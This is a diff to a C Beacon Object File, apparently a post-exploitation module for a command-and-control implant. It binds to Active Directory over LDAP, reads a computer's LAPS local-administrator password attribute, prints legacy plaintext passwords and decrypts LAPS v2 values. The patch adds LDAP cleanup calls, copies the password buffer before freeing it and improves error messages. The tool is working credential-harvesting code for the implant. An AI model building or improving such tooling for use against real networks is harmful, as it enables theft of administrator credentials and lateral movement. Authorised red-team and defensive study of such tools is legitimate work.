@@ -28,18 +28,22 @@ typedef struct NCRYPT_PROTECT_STREAM_INFO {
 // WLDAP32 function pointers
 typedef LDAP *LDAPAPI (*ldap_initA_t)(PSTR HostName, ULONG PortNumber);
 typedef ULONG LDAPAPI (*ldap_bind_sA_t)(LDAP *ld, const PSTR dn, const PCHAR cred, ULONG method);
+typedef ULONG LDAPAPI (*ldap_unbind_t)(LDAP *ld);
 typedef ULONG LDAPAPI (*ldap_search_s_t)(LDAP *ld, const PSTR base, ULONG scope, const PSTR filter, PCHAR attrs[], ULONG attrsonly, LDAPMessage **res);
 typedef ULONG LDAPAPI (*ldap_count_entries_t)(LDAP *ld, LDAPMessage *res);
 typedef LDAPMessage* LDAPAPI (*ldap_first_entry_t)(LDAP *ld, LDAPMessage *res);
 typedef struct berval **LDAPAPI (*ldap_get_values_lenA_t)(LDAP *ld, LDAPMessage *entry, const PCHAR attr);
+typedef ULONG LDAPAPI (*ldap_value_free_len_t)(struct berval **vals);
 typedef ULONG LDAPAPI (*ldap_msgfree_t)(LDAPMessage *res);
 
 #define WLDAP32$ldap_initA ((ldap_initA_t)DynamicLoad("WLDAP32", "ldap_initA"))
 #define WLDAP32$ldap_bind_sA ((ldap_bind_sA_t)DynamicLoad("WLDAP32", "ldap_bind_sA"))
+#define WLDAP32$ldap_unbind ((ldap_unbind_t)DynamicLoad("WLDAP32", "ldap_unbind"))
 #define WLDAP32$ldap_search_s ((ldap_search_s_t)DynamicLoad("WLDAP32", "ldap_search_s"))
 #define WLDAP32$ldap_count_entries ((ldap_count_entries_t)DynamicLoad("WLDAP32", "ldap_count_entries"))
 #define WLDAP32$ldap_first_entry ((ldap_first_entry_t)DynamicLoad("WLDAP32", "ldap_first_entry"))
 #define WLDAP32$ldap_get_values_lenA ((ldap_get_values_lenA_t)DynamicLoad("WLDAP32", "ldap_get_values_lenA"))
+#define WLDAP32$ldap_value_free_len ((ldap_value_free_len_t)DynamicLoad("WLDAP32", "ldap_value_free_len"))
 #define WLDAP32$ldap_msgfree ((ldap_msgfree_t)DynamicLoad("WLDAP32", "ldap_msgfree"))
 
 // NCRYPT function pointers
@@ -79,9 +83,9 @@ BOOL searchLdap(PSTR ldapServer, ULONG port, PCHAR rootDN, PCHAR searchFilter, c
     ULONG entryCount;
     PLDAPMessage firstEntry = NULL;
     struct berval** outval = NULL;
+    ULONG result;
 
     *isEncrypted = TRUE; // Default to encrypted (LAPS v2)
-
 
     ldapHandle = WLDAP32$ldap_initA(ldapServer, port);
     if (ldapHandle == NULL) {
@@ -89,31 +93,37 @@ BOOL searchLdap(PSTR ldapServer, ULONG port, PCHAR rootDN, PCHAR searchFilter, c
         return FALSE;
     }
 
-    if (WLDAP32$ldap_bind_sA(ldapHandle, rootDN, NULL, LDAP_AUTH_NEGOTIATE) != LDAP_SUCCESS) {
-        BeaconPrintf(CALLBACK_ERROR, "[!] Error Initialising LDAP connection: ldap_bind_sA");
+    result = WLDAP32$ldap_bind_sA(ldapHandle, rootDN, NULL, LDAP_AUTH_NEGOTIATE);
+    if (result != LDAP_SUCCESS) {
+        BeaconPrintf(CALLBACK_ERROR, "[!] Error binding to LDAP server (code: 0x%x). Try using a hostname instead of IP address.", result);
+        WLDAP32$ldap_unbind(ldapHandle);
         return FALSE;
     }
 
-    if (WLDAP32$ldap_search_s(ldapHandle, rootDN, LDAP_SCOPE_SUBTREE, searchFilter, attr, 0, &searchResult) != LDAP_SUCCESS) {
+    result = WLDAP32$ldap_search_s(ldapHandle, rootDN, LDAP_SCOPE_SUBTREE, searchFilter, attr, 0, &searchResult);
+    if (result != LDAP_SUCCESS) {
+        BeaconPrintf(CALLBACK_ERROR, "[!] LDAP search failed (code: 0x%x)", result);
         if (searchResult != NULL)
             WLDAP32$ldap_msgfree(searchResult);
-        BeaconPrintf(CALLBACK_ERROR, "[!] Error Using LDAP connection: ldap_search_s");
+        WLDAP32$ldap_unbind(ldapHandle);
         return FALSE;
     }
 
     entryCount = WLDAP32$ldap_count_entries(ldapHandle, searchResult);
     if (entryCount == 0) {
+        BeaconPrintf(CALLBACK_ERROR, "[!] 0 results found from LDAP");
         if (searchResult != NULL)
             WLDAP32$ldap_msgfree(searchResult);
-        BeaconPrintf(CALLBACK_ERROR, "[!] 0 results found from LDAP");
+        WLDAP32$ldap_unbind(ldapHandle);
         return FALSE;
     }
 
     firstEntry = WLDAP32$ldap_first_entry(ldapHandle, searchResult);
     if (firstEntry == NULL) {
+        BeaconPrintf(CALLBACK_ERROR, "[!] Error getting first LDAP entry");
         if (searchResult != NULL)
             WLDAP32$ldap_msgfree(searchResult);
-        BeaconPrintf(CALLBACK_ERROR, "[!] Error ldap_first_entry");
+        WLDAP32$ldap_unbind(ldapHandle);
         return FALSE;
     }
 
@@ -123,22 +133,35 @@ BOOL searchLdap(PSTR ldapServer, ULONG port, PCHAR rootDN, PCHAR searchFilter, c
         // Try legacy LAPS attribute
         outval = WLDAP32$ldap_get_values_lenA(ldapHandle, firstEntry, attr[1]);
         if (outval == NULL) {
+            BeaconPrintf(CALLBACK_ERROR, "[!] Computer found but no LAPS password attribute present");
             if (searchResult != NULL)
                 WLDAP32$ldap_msgfree(searchResult);
-            if (firstEntry != NULL)
-                WLDAP32$ldap_msgfree(firstEntry);
-            BeaconPrintf(CALLBACK_ERROR, "[!] Computer found but no LAPS password attribute present");
+            WLDAP32$ldap_unbind(ldapHandle);
             return FALSE;
         }
         *isEncrypted = FALSE; // Legacy LAPS is plaintext
         BeaconPrintf(CALLBACK_OUTPUT, "[!] This appears to be legacy LAPS (not v2). Password is not encrypted.");
-        *output = (char*)outval[0]->bv_val;
-        *length = outval[0]->bv_len;
-        return TRUE;
     }
 
-    *output = (char*)outval[0]->bv_val;
+    // Copy the output data before cleaning up LDAP resources
     *length = outval[0]->bv_len;
+    *output = (char*)intAlloc(*length + 1);
+    if (*output == NULL) {
+        BeaconPrintf(CALLBACK_ERROR, "[!] Memory allocation failed");
+        WLDAP32$ldap_value_free_len(outval);
+        if (searchResult != NULL)
+            WLDAP32$ldap_msgfree(searchResult);
+        WLDAP32$ldap_unbind(ldapHandle);
+        return FALSE;
+    }
+    MSVCRT$memcpy(*output, outval[0]->bv_val, *length);
+    (*output)[*length] = '\0'; // Null terminate for safety
+
+    // Clean up LDAP resources
+    WLDAP32$ldap_value_free_len(outval);
+    if (searchResult != NULL)
+        WLDAP32$ldap_msgfree(searchResult);
+    WLDAP32$ldap_unbind(ldapHandle);
 
     return TRUE;
 }
@@ -222,6 +245,7 @@ void go(char* args, int len) {
     // If legacy LAPS just print the password
     if (!isEncrypted) {
         BeaconPrintf(CALLBACK_OUTPUT, "[+] Legacy LAPS Password: %s", (char*)output);
+        intFree(output); // Clean up allocated memory
         return;
     }
 
@@ -241,7 +265,9 @@ void go(char* args, int len) {
 
     if (!unprotectSecret((BYTE*)output, length)) {
         BeaconPrintf(CALLBACK_ERROR, "[!] Could not unprotect LAPS creds");
+        intFree(output);
         return;
     }
 
+    intFree(output);
 }
